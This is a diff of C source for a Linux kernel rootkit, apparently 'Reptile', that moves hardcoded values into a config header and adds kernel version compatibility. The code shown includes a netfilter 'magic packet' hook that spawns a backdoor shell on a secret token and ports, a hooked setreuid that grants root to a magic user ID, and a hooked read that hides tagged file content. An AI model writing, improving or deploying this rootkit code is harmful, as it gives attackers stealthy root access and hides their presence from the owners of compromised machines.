@@ -27,6 +27,7 @@
 #include <linux/tcp.h>
 #include <linux/udp.h>
 #include <linux/string.h>
+#include "sbin/config.h"
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 	#include <linux/proc_ns.h>
@@ -44,16 +45,10 @@
 #endif
 
 #define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
-#define TOKEN		"F0rb1dd3n"
-#define SHELL		"/reptile/reptile_shell"
-#define START 		"/reptile/reptile_start.sh"
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
 #define SIGHIDECONTENT  51
-#define HIDE 		"reptile"
 #define SSIZE_MAX 	32767
-#define HIDETAGIN 	"#<reptile>"
-#define HIDETAGOUT 	"#</reptile>"
 
 int hidden = 0, knockon = 0, hide_file_content = 1;
 static struct list_head *mod_list;
@@ -232,6 +227,8 @@ void decode_n_spawn(char *data) {
 
     	tsize = strlen(TOKEN);
 	buf = (char *) kmalloc(tsize+24, GFP_KERNEL);
+	if(!buf) return;
+
         bzero(buf, tsize+24);
         memcpy(buf, data, tsize+24);
         s_xor(buf, 11, strlen(buf));
@@ -290,7 +287,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     		
 		if (!data) return NF_ACCEPT;
 
-		if(htons(tcp_header->source) == 666 && htons(tcp_header->dest) == 80 && memcmp(data, token, tsize) == 0){
+		if(htons(tcp_header->source) == SRCPORT && htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0){
 			decode_n_spawn(data);
 			return NF_DROP;
 		}
@@ -305,7 +302,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     		
 		if (!data) return NF_ACCEPT;
 
-		if(htons(udp_header->source) == 666 && htons(udp_header->dest) == 53 && memcmp(data, token, tsize) == 0){
+		if(htons(udp_header->source) == SRCPORT && htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0){
 			decode_n_spawn(data);
 			return NF_DROP;
 		}
@@ -407,7 +404,7 @@ asmlinkage int l33t_setreuid(uid_t ruid, uid_t euid){
 
 	int ret = 0;
 
-    	if(ruid == 1337 && euid == 1337){
+    	if(ruid == MAGIC_ID && euid == MAGIC_ID){
         	commit_creds(prepare_kernel_cred(0));
         	ret = o_setreuid(0, 0);
     	} else {
@@ -538,8 +535,11 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 		f = e_fget_light(fd, &fput_needed);
 
 		if (f) {
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
 			ret = vfs_read(f, buf, nbytes, &f->f_pos);
-
+#else
+			ret = kernel_read(f, buf, nbytes, &f->f_pos);
+#endif
 			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
 	    	
 			fput_light(f, fput_needed);
@@ -588,7 +588,7 @@ static int __init reptile_init(void) {
 #else
     	nf_register_hook(&magic_packet_hook_options);
 #endif
-    	work_queue = create_workqueue("reptile_shell");	
+    	work_queue = create_workqueue(WORKQUEUE);	
 	exec(argv);
 
 	return 0; 
